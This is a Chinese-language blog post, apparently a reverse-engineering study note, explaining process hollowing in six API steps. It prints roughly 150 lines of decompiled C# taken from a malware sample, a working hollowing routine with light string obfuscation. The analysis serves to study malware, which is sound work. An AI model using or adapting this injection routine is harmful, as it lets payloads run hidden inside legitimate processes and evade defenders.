@@ -1,0 +1,238 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+    <meta name="keywords" content="业余，逆向，C，脚本，病毒，摸鱼，划水，APT，漏洞，攻击">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    傀儡进程 |
+    
+    Y</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+  
+  <script src="/js/pace.min.js"></script>
+</head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-傀儡进程" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      傀儡进程
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/11/19/%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B/" class="article-date">
+  <time datetime="2019-11-19T11:31:56.000Z" itemprop="datePublished">2019-11-19</time>
+</a>
+        
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <p> 傀儡进程是指将目标进程的映射文件替换为指定的映射文件，替换后的进程称之为傀儡进程。 </p>
+<p>前边分析样本，碰到个创建傀儡进程的dll，看了半天代码，才看懂是创建傀儡进程<br>写个笔记，总结一下<br>参考：<a href="https://www.4hou.com/technology/8869.html">https://www.4hou.com/technology/8869.html</a></p>
+<a id="more"></a>
+
+<h5 id="实现思路："><a href="#实现思路：" class="headerlink" title="实现思路："></a>实现思路：</h5><p>1.通过CreateProcess创建进程，传入参数CREATE_SUSPENDED使进程挂起<br>2.通过NtUnmapViewOfSection清空新进程的内存数据<br>3.通过VirtualAllocEx申请新的内存<br>4.通过WriteProcessMemory向内存写入payload<br>5.通过SetThreadContext设置入口点<br>6.通过ResumeThread唤醒进程，执行payload</p>
+<h6 id="1、傀儡进程的选择"><a href="#1、傀儡进程的选择" class="headerlink" title="1、傀儡进程的选择"></a>1、傀儡进程的选择</h6><p>如果傀儡进程已经运行，那么将无法实现替换(指针不可控、无法获得主线程句柄等)<br>所以这种利用方法只能通过创建新进程，传入参数CREATE_SUSPENDED使进程挂起，在进程执行前对其替换</p>
+<h6 id="2、清空新进程的内存数据"><a href="#2、清空新进程的内存数据" class="headerlink" title="2、清空新进程的内存数据"></a>2、清空新进程的内存数据</h6><p>进程初始化后，内存会加载映像文件，为了清空新进程的内存数据，可以使用函数NtUnmapViewOfSection卸载映像</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">NtUnmapViewOfSection</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">  _In_     HANDLE ProcessHandle,    <span class="comment">//进程句柄</span></span></span></span><br><span class="line"><span class="function"><span class="params">  _In_opt_ PVOID  BaseAddress       <span class="comment">//映像基址 ，base virtual address</span></span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br></pre></td></tr></table></figure>
+<h6 id="3、申请新的内存"><a href="#3、申请新的内存" class="headerlink" title="3、申请新的内存"></a>3、申请新的内存</h6><p>使用VirtualAllocEx函数时，可以将傀儡进程的ImageBaseAddress作为申请空间的首地址，这样可以避免考虑“重定位”的问题</p>
+<h6 id="4、写入payload"><a href="#4、写入payload" class="headerlink" title="4、写入payload"></a>4、写入payload</h6><p>写入时，需要先比较payload和傀儡进程的ImageBaseAddress之间的偏移，如果存在偏移，需要进行重定位(使用.reloc区段)</p>
+<h6 id="5、恢复环境"><a href="#5、恢复环境" class="headerlink" title="5、恢复环境"></a>5、恢复环境</h6><p>替换前后需要保证寄存器正常，所以仅需要修改进程的入口点(即EAX寄存器)<br>在最开始通过GetThreadContext获得所有寄存器的信息(保存在结构体_CONTEXT中)<br>然后使用SetThreadContext恢复寄存器信息，再通过ResumeThread唤醒进程，即可执行payload</p>
+<p>样本中的创建傀儡进程</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">bool</span> <span class="title">smethod_0</span><span class="params">(<span class="built_in">string</span> string_0, <span class="keyword">byte</span>[] byte_0, <span class="keyword">bool</span> bool_0)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">			<span class="built_in">string</span> string_ = <span class="string">"\"&#123;path&#125;\""</span>;</span><br><span class="line">			VOVO.Struct6 @<span class="class"><span class="keyword">struct</span> = <span class="title">default</span>(<span class="title">VOVO</span>.<span class="title">Struct6</span>);</span></span><br><span class="line">			VOVO.Struct5 struct2 = <span class="keyword">default</span>(VOVO.Struct5);</span><br><span class="line">			@<span class="class"><span class="keyword">struct</span>.<span class="title">uint_0</span> = <span class="title">Convert</span>.<span class="title">ToUInt32</span>(<span class="title">Marshal</span>.<span class="title">SizeOf</span>(<span class="title">typeof</span>(<span class="title">VOVO</span>.<span class="title">Struct6</span>)));</span></span><br><span class="line">			<span class="keyword">bool</span> result;</span><br><span class="line">			<span class="keyword">try</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (!VOVO.CreateProcess(string_0, string_, IntPtr.Zero, IntPtr.Zero, <span class="literal">false</span>, <span class="number">4u</span>, IntPtr.Zero, null, ref @struct, ref struct2))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">				&#125;</span><br><span class="line">				MethodInfo method = typeof(BitConverter).GetMethod(<span class="string">"ToInt32"</span>);</span><br><span class="line">				object[] parameters = <span class="keyword">new</span> object[]</span><br><span class="line">				&#123;</span><br><span class="line">					byte_0,</span><br><span class="line">					<span class="number">60</span></span><br><span class="line">				&#125;;</span><br><span class="line">				<span class="keyword">int</span> num2 = Convert.ToInt32(method.Invoke(null, parameters));</span><br><span class="line">				object[] parameters2 = <span class="keyword">new</span> object[]</span><br><span class="line">				&#123;</span><br><span class="line">					byte_0,</span><br><span class="line">					num2 + <span class="number">26</span> + <span class="number">26</span></span><br><span class="line">				&#125;;</span><br><span class="line">				<span class="keyword">int</span> num3 = Convert.ToInt32(method.Invoke(null, parameters2));</span><br><span class="line">				<span class="keyword">int</span>[] <span class="built_in">array</span> = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">179</span>];</span><br><span class="line">				<span class="built_in">array</span>[<span class="number">0</span>] = <span class="number">65538</span>;</span><br><span class="line">				<span class="keyword">if</span> (IntPtr.Size == <span class="number">4</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (!VOVO.GetThreadContext(struct2.intptr_1, <span class="built_in">array</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (!VOVO.Wow64GetThreadContext(struct2.intptr_1, <span class="built_in">array</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">int</span> num4 = <span class="built_in">array</span>[<span class="number">41</span>];</span><br><span class="line">				<span class="keyword">int</span> num5 = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">if</span> (!VOVO.ReadProcessMemory(struct2.intptr_0, num4 + <span class="number">4</span> + <span class="number">4</span>, ref num5, <span class="number">4</span>, ref num))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (num3 == num5 &amp;&amp; VOVO.NtUnmapViewOfSection(struct2.intptr_0, num5) != <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">				&#125;</span><br><span class="line">				object[] parameters3 = <span class="keyword">new</span> object[]</span><br><span class="line">				&#123;</span><br><span class="line">					byte_0,</span><br><span class="line">					num2 + <span class="number">80</span></span><br><span class="line">				&#125;;</span><br><span class="line">				<span class="keyword">int</span> int_ = Convert.ToInt32(method.Invoke(null, parameters3));</span><br><span class="line">				object[] parameters4 = <span class="keyword">new</span> object[]</span><br><span class="line">				&#123;</span><br><span class="line">					byte_0,</span><br><span class="line">					num2 + <span class="number">42</span> + <span class="number">42</span></span><br><span class="line">				&#125;;</span><br><span class="line">				<span class="keyword">int</span> int_2 = Convert.ToInt32(method.Invoke(null, parameters4));</span><br><span class="line">				<span class="keyword">bool</span> flag = <span class="literal">false</span>;</span><br><span class="line">				<span class="keyword">int</span> num6 = VOVO.VirtualAllocEx(struct2.intptr_0, num3, int_, <span class="number">12288</span>, <span class="number">64</span>);</span><br><span class="line">				<span class="keyword">if</span> (num6 == <span class="number">0</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (!VOVO.WriteProcessMemory(struct2.intptr_0, num6, byte_0, int_2, ref num))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">int</span> num7 = num2 + <span class="number">248</span>;</span><br><span class="line">				<span class="keyword">short</span> num8 = BitConverter.ToInt16(byte_0, num2 + <span class="number">3</span> + <span class="number">3</span>);</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="keyword">int</span>)num8; i++)</span><br><span class="line">				&#123;</span><br><span class="line">					object[] parameters5 = <span class="keyword">new</span> object[]</span><br><span class="line">					&#123;</span><br><span class="line">						byte_0,</span><br><span class="line">						num7 + <span class="number">6</span> + <span class="number">6</span></span><br><span class="line">					&#125;;</span><br><span class="line">					<span class="keyword">int</span> num9 = Convert.ToInt32(method.Invoke(null, parameters5));</span><br><span class="line">					object[] parameters6 = <span class="keyword">new</span> object[]</span><br><span class="line">					&#123;</span><br><span class="line">						byte_0,</span><br><span class="line">						num7 + <span class="number">8</span> + <span class="number">8</span></span><br><span class="line">					&#125;;</span><br><span class="line">					<span class="keyword">int</span> num10 = Convert.ToInt32(method.Invoke(null, parameters6));</span><br><span class="line">					object[] parameters7 = <span class="keyword">new</span> object[]</span><br><span class="line">					&#123;</span><br><span class="line">						byte_0,</span><br><span class="line">						num7 + <span class="number">20</span></span><br><span class="line">					&#125;;</span><br><span class="line">					<span class="keyword">int</span> num11 = Convert.ToInt32(method.Invoke(null, parameters7));</span><br><span class="line">					<span class="keyword">if</span> (num10 != <span class="number">0</span>)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">byte</span>[] array2 = <span class="keyword">new</span> <span class="keyword">byte</span>[num10];</span><br><span class="line">						MethodInfo method2 = typeof(Buffer).GetMethod(<span class="string">"Bl#####ckC#####py"</span>.Replace(<span class="string">"#####"</span>, <span class="string">"o"</span>));</span><br><span class="line">						object[] parameters8 = <span class="keyword">new</span> object[]</span><br><span class="line">						&#123;</span><br><span class="line">							byte_0,</span><br><span class="line">							num11,</span><br><span class="line">							array2,</span><br><span class="line">							<span class="number">0</span>,</span><br><span class="line">							array2.Length</span><br><span class="line">						&#125;;</span><br><span class="line">						method2.Invoke(null, parameters8);</span><br><span class="line">						<span class="keyword">if</span> (!VOVO.WriteProcessMemory(struct2.intptr_0, num6 + num9, array2, array2.Length, ref num))</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					num7 += <span class="number">40</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">byte</span>[] bytes = BitConverter.GetBytes(num6);</span><br><span class="line">				<span class="keyword">if</span> (!VOVO.WriteProcessMemory(struct2.intptr_0, num4 + <span class="number">8</span>, bytes, <span class="number">4</span>, ref num))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">				&#125;</span><br><span class="line">				object[] parameters9 = <span class="keyword">new</span> object[]</span><br><span class="line">				&#123;</span><br><span class="line">					byte_0,</span><br><span class="line">					num2 + <span class="number">40</span></span><br><span class="line">				&#125;;</span><br><span class="line">				<span class="keyword">int</span> num12 = Convert.ToInt32(method.Invoke(null, parameters9));</span><br><span class="line">				<span class="keyword">if</span> (flag)</span><br><span class="line">				&#123;</span><br><span class="line">					num6 = num3;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="built_in">array</span>[<span class="number">44</span>] = num6 + num12;</span><br><span class="line">				<span class="keyword">if</span> (IntPtr.Size == <span class="number">4</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (!VOVO.SetThreadContext(struct2.intptr_1, <span class="built_in">array</span>))</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span> (!VOVO.Wow64SetThreadContext(struct2.intptr_1, <span class="built_in">array</span>))</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span> (VOVO.ResumeThread(struct2.intptr_1) == <span class="number">-1</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> Exception();</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">Process</span> processById = <span class="built_in">Process</span>.GetProcessById(Convert.ToInt32(struct2.uint_0));</span><br><span class="line">				processById.Kill();</span><br><span class="line">				result = <span class="literal">false</span>;</span><br><span class="line">				<span class="keyword">return</span> result;</span><br><span class="line">			&#125;</span><br><span class="line">			result = <span class="literal">true</span>;</span><br><span class="line">			<span class="keyword">return</span> result;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/11/19/%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B/" data-id="ck4fawz0o0034k0u691n0ezq9"
+         class="article-share-link">Share</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B/" rel="tag">傀儡进程</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B3%A8%E5%85%A5/" rel="tag">注入</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2019/12/03/%E5%AE%9E%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E4%B8%AD%E6%96%AD%E5%90%91%E9%87%8F%E8%A1%A8-IVT/" class="article-nav-link">
+        <strong class="article-nav-caption">Newer posts</strong>
+        <div class="article-nav-title">
+          
+            实模式下的中断向量表(IVT)
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2019/11/19/tfukrc-exe%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/" class="article-nav-link">
+        <strong class="article-nav-caption">Olde posts</strong>
+        <div class="article-nav-title">tfukrc.exe勒索病毒</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+  <footer class="footer">
+  <div class="outer">
+    <div class="float-right">
+      <ul class="list-inline">
+  
+    <li><i class="fe fe-smile-alt"></i> <span id="busuanzi_value_site_uv"></span></li>
+  
+</ul>
+    </div>
+    <ul class="list-inline">
+      <li>&copy; 2019 Y</li>
+      <li>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></li>
+      <li>Theme  <a href="https://github.com/zhwangart/hexo-theme-ocean">Ocean</a></li>
+    </ul>
+  </div>
+</footer>
+
+</main>
+
+<aside class="sidebar sidebar-specter">
+  
+    <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+    <div class="logo">
+      <a href="/"><img src="/images/hexo.svg" alt="Y"></a>
+    </div>
+  
+  <ul class="nav nav-main">
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/">Home</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/archives">Archives</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/gallery">Gallery</a>
+      </li>
+    
+      <li class="nav-item">
+        <a class="nav-item-link" href="/about">About</a>
+      </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link nav-item-search" title="Search">
+        <i class="fe fe-search"></i>
+        Search
+      </a>
+    </li>
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      <div class="totop" id="totop">
+  <i class="fe fe-rocket"></i>
+</div>
+    </li>
+    <li class="nav-item">
+      
+        <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+          <i class="fe fe-feed"></i>
+        </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+  </aside>
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<script src="/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/lazyload.min.js"></script>
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+  <script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+  <script src="/js/tocbot.min.js"></script>
+  <script>
+    // Tocbot_v4.7.0  http://tscanlin.github.io/tocbot/
+    tocbot.init({
+      tocSelector: '.tocbot',
+      contentSelector: '.article-entry',
+      headingSelector: 'h1, h2, h3, h4, h5, h6',
+      hasInnerContainers: true,
+      scrollSmooth: true,
+      positionFixedSelector: '.tocbot',
+      positionFixedClass: 'is-position-fixed',
+      fixedSidebarOffset: 'auto',
+    });
+  </script>
+
+
+<script src="/js/ocean.js"></script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body>
+</html>
